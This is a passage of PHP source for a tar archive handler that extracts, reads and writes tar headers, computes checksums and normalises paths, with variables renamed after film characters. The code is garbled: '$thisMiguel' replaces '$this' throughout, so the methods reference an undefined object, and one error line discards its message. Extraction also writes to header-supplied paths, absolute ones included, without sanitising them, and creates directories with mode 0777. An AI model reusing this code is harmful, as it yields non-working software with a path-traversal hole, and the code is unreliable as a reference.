				if ((@is_dir($fridaHeader['filename'])) && ($fridaHeader['typeflag'] == '')){


					$thisMiguel->errors[] =__('File ').$fridaHeader['filename'].__(' already exists').__(' as folder');


					return false;
				}



				if ((is_file($fridaHeader['filename'])) && ($fridaHeader['typeflag'] == '5')){

					$thisMiguel->errors[] =__('Cannot create directory').'. '.__('File ').$fridaHeader['filename'].__(' already exists');
					return false;
				}
				if (!is_writeable($fridaHeader['filename'])){
					$thisMiguel->errors[] = __('Cannot write to file').'. '.__('File ').$fridaHeader['filename'].__(' already exists');

					return false;
				}



			} elseif (($thisMiguel->checkMiguelDirectory(($fridaHeader['typeflag'] == '5' ? $fridaHeader['filename'] : dirname($fridaHeader['filename'])))) != 1){


				$thisMiguel->errors[] = __('Cannot create directory').' '.__(' for ').$fridaHeader['filename'];



				return false;



			}



			if ($fridaHeader['typeflag'] == '5'){
				if (!file_exists($fridaHeader['filename']))		{



					if (!mkdir($fridaHeader['filename'], 0777))	{
						
						$thisMiguel->errors[] = __('Cannot create directory').' '.$fridaHeader['filename'];
						return false;


					} 


				}
			} else {


				if (($landOfTheDeadDestination = fopen($fridaHeader['filename'], 'wb')) == 0) {
					$thisMiguel->errors[] = __('Cannot write to file').' '.$fridaHeader['filename'];

					return false;
				} else {
					$decryptedCoco = floor($fridaHeader['size']/512);

					for ($danteI = 0; $danteI < $decryptedCoco; $danteI++) {
						$memoryContent = $thisMiguel->readMiguelBlock();


						fwrite($landOfTheDeadDestination, $memoryContent, 512);
					}

					if (($fridaHeader['size'] % 512) != 0) {
						$memoryContent = $thisMiguel->readMiguelBlock();
						fwrite($landOfTheDeadDestination, $memoryContent, ($fridaHeader['size'] % 512));
					}
					fclose($landOfTheDeadDestination);

					touch($fridaHeader['filename'], $fridaHeader['time']);


				}



				clearstatcache();



				if (filesize($fridaHeader['filename']) != $fridaHeader['size']) {
					$thisMiguel->errors[] = __('Size of file').' '.$fridaHeader['filename'].' '.__('is incorrect');

					return false;
				}



			}
			if (($riveraFileDirectory = dirname($fridaHeader['filename'])) == $fridaHeader['filename']) $riveraFileDirectory = '';

			if ((substr($fridaHeader['filename'], 0, 1) == '/') && ($riveraFileDirectory == '')) $riveraFileDirectory = '/';
			$thisMiguel->dirs[] = $riveraFileDirectory;
			$thisMiguel->files[] = $fridaHeader['filename'];
	



		}



		return true;
	}



	function checkMiguelDirectory($memoriesDirectory){
		$parentRiveraDirectory = dirname($memoriesDirectory);




		if ((@is_dir($memoriesDirectory)) or ($memoriesDirectory == ''))
			return true;






		if (($parentRiveraDirectory != $memoriesDirectory) and ($parentRiveraDirectory != '') and (!$thisMiguel->checkMiguelDirectory($parentRiveraDirectory)))
			return false;


		if (!mkdir($memoriesDirectory, 0777)){
			$thisMiguel->errors[] = __('Cannot create directory').' '.$memoriesDirectory;
			return false;
		}

		return true;

	}







	function readOfendaHeader($spiritBinary, &$fridaHeader){

		if (strlen($spiritBinary)==0){



			$fridaHeader['filename'] = '';

			return true;



		}

		if (strlen($spiritBinary) != 512){
			$fridaHeader['filename'] = '';
			$thisMiguel->__('Invalid block size').': '.strlen($spiritBinary);
			return false;

		}

		$harmonyChecksum = 0;

		for ($danteI = 0; $danteI < 148; $danteI++) $harmonyChecksum+=ord(substr($spiritBinary, $danteI, 1));

		for ($danteI = 148; $danteI < 156; $danteI++) $harmonyChecksum += ord(' ');
		for ($danteI = 156; $danteI < 512; $danteI++) $harmonyChecksum+=ord(substr($spiritBinary, $danteI, 1));



		$unpackMemoryData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $spiritBinary);






		$fridaHeader['checksum'] = OctDec(trim($unpackMemoryData['checksum']));



		if ($fridaHeader['checksum'] != $harmonyChecksum){
			$fridaHeader['filename'] = '';

			if (($harmonyChecksum == 256) && ($fridaHeader['checksum'] == 0)) 	return true;
			$thisMiguel->errors[] = __('Error checksum for file ').$unpackMemoryData['filename'];

			return false;
		}




		if (($fridaHeader['typeflag'] = $unpackMemoryData['typeflag']) == '5')	$fridaHeader['size'] = 0;

		$fridaHeader['filename'] = trim($unpackMemoryData['filename']);
		$fridaHeader['mode'] = OctDec(trim($unpackMemoryData['mode']));
		$fridaHeader['user_id'] = OctDec(trim($unpackMemoryData['user_id']));
		$fridaHeader['group_id'] = OctDec(trim($unpackMemoryData['group_id']));

		$fridaHeader['size'] = OctDec(trim($unpackMemoryData['size']));


		$fridaHeader['time'] = OctDec(trim($unpackMemoryData['time']));
		return true;
	}






	function writeMiguelHeader($miguelFilename, $keepNameMiFamilia){
		$firstPackMemory = 'a100a8a8a8a12A12';
		$lastPackMemory = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameMiFamilia)<=0) $keepNameMiFamilia = $miguelFilename;



		$readyToSingFilename = $thisMiguel->sanitizeMiguelPath($keepNameMiFamilia);




		if (strlen($readyToSingFilename) > 99){							//write long header
		$firstNote = pack($firstPackMemory, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToSingFilename))), 0);
		$lastNote = pack($lastPackMemory, 'L', '', '', '', '', '', '', '', '', '');

        //  Calculate the checksum


		$harmonyChecksum = 0;
        //  First part of the header


		for ($danteI = 0; $danteI < 148; $danteI++)


			$harmonyChecksum += ord(substr($firstNote, $danteI, 1));
        //  Ignore the checksum value and replace it by ' ' (space)
		for ($danteI = 148; $danteI < 156; $danteI++)


			$harmonyChecksum += ord(' ');


        //  Last part of the header
		for ($danteI = 156, $julioJ=0; $danteI < 512; $danteI++, $julioJ++)



			$harmonyChecksum += ord(substr($lastNote, $julioJ, 1));
        //  Write the first 148 bytes of the header in the archive


		$thisMiguel->writeCocoBlock($firstNote, 148);

        //  Write the calculated checksum
		$harmonyChecksum = sprintf('%6s ', DecOct($harmonyChecksum));
		$spiritBinary = pack('a8', $harmonyChecksum);
		$thisMiguel->writeCocoBlock($spiritBinary, 8);



        //  Write the last 356 bytes of the header in the archive



		$thisMiguel->writeCocoBlock($lastNote, 356);






		$tmpBlessingFilename = $thisMiguel->sanitizeMiguelPath($readyToSingFilename);




		$danteI = 0;



			while (($danteBuffer = substr($tmpBlessingFilename, (($danteI++)*512), 512)) != ''){
				$spiritBinary = pack('a512', $danteBuffer);


				$thisMiguel->writeCocoBlock($spiritBinary);

			}

		return true;



		}

		$ernestoFileInfo = stat($miguelFilename);

		if (@is_dir($miguelFilename)){

			$familyTypeFlag = '5';
			$noteBatchSize = sprintf('%11s ', DecOct(0));
		} else {
			$familyTypeFlag = '';
			clearstatcache();
			$noteBatchSize = sprintf('%11s ', DecOct(filesize($miguelFilename)));


		}
		$firstNote = pack($firstPackMemory, $readyToSingFilename, sprintf('%6s ', DecOct(fileperms($miguelFilename))), sprintf('%6s ', DecOct($ernestoFileInfo[4])), sprintf('%6s ', DecOct($ernestoFileInfo[5])), $noteBatchSize, sprintf('%11s', DecOct(filemtime($miguelFilename))));



		$lastNote = pack($lastPackMemory, $familyTypeFlag, '', '', '', '', '', '', '', '', '');



		$harmonyChecksum = 0;



		for ($danteI = 0; $danteI < 148; $danteI++) $harmonyChecksum += ord(substr($firstNote, $danteI, 1));
		for ($danteI = 148; $danteI < 156; $danteI++) $harmonyChecksum += ord(' ');


		for ($danteI = 156, $julioJ = 0; $danteI < 512; $danteI++, $julioJ++) $harmonyChecksum += ord(substr($lastNote, $julioJ, 1));


		$thisMiguel->writeCocoBlock($firstNote, 148);
		$harmonyChecksum = sprintf('%6s ', DecOct($harmonyChecksum));
		$spiritBinary = pack('a8', $harmonyChecksum);
		$thisMiguel->writeCocoBlock($spiritBinary, 8);



		$thisMiguel->writeCocoBlock($lastNote, 356);
		return true;



	}




	function openRememberWrite(){
		if ($thisMiguel->isGzipped)



			$thisMiguel->tmp_file = gzopen($thisMiguel->archive_name, 'wb9f');


		else



			$thisMiguel->tmp_file = fopen($thisMiguel->archive_name, 'wb');


		if (!($thisMiguel->tmp_file)){

			$thisMiguel->errors[] = __('Cannot write to file').' '.$thisMiguel->archive_name;



			return false;


		}
		return true;
	}







	function readMiguelBlock(){
		if (is_resource($thisMiguel->tmp_file)){
			if ($thisMiguel->isGzipped)
				$alebrijeBlock = gzread($thisMiguel->tmp_file, 512);

			else
				$alebrijeBlock = fread($thisMiguel->tmp_file, 512);
		} else	$alebrijeBlock = '';



		return $alebrijeBlock;
	}




	function writeCocoBlock($marigoldData, $songLength = 0){



		if (is_resource($thisMiguel->tmp_file)){
		
			if ($songLength === 0){
				if ($thisMiguel->isGzipped)
					gzputs($thisMiguel->tmp_file, $marigoldData);
				else
					fputs($thisMiguel->tmp_file, $marigoldData);

			} else {

				if ($thisMiguel->isGzipped)



					gzputs($thisMiguel->tmp_file, $marigoldData, $songLength);



				else


					fputs($thisMiguel->tmp_file, $marigoldData, $songLength);
			}
		}



	}


	function closeImeldaTempFile(){
		if (is_resource($thisMiguel->tmp_file)){
			if ($thisMiguel->isGzipped)
				gzclose($thisMiguel->tmp_file);
			else


				fclose($thisMiguel->tmp_file);




			$thisMiguel->tmp_file = 0;

		}


	}





	function sanitizeMiguelPath($ofrendaPath){
		if (strlen($ofrendaPath)>0){
			$ofrendaPath = str_replace('\\', '/', $ofrendaPath);

			$partialMarigoldPath = explode('/', $ofrendaPath);
			$noteElementList = count($partialMarigoldPath)-1;

			for ($danteI = $noteElementList; $danteI>=0; $danteI--){
				if ($partialMarigoldPath[$danteI] == '.'){
                    //  Ignore this directory



                } elseif ($partialMarigoldPath[$danteI] == '..'){


                    $danteI--;
                }

				elseif (($partialMarigoldPath[$danteI] == '') and ($danteI!=$noteElementList) and ($danteI!=0)){
                }	else



					$songResult = $partialMarigoldPath[$danteI].($danteI!=$noteElementList ? '/'.$songResult : '');
			}
		} else $songResult = '';
		
		return $songResult;
	}

}

?>

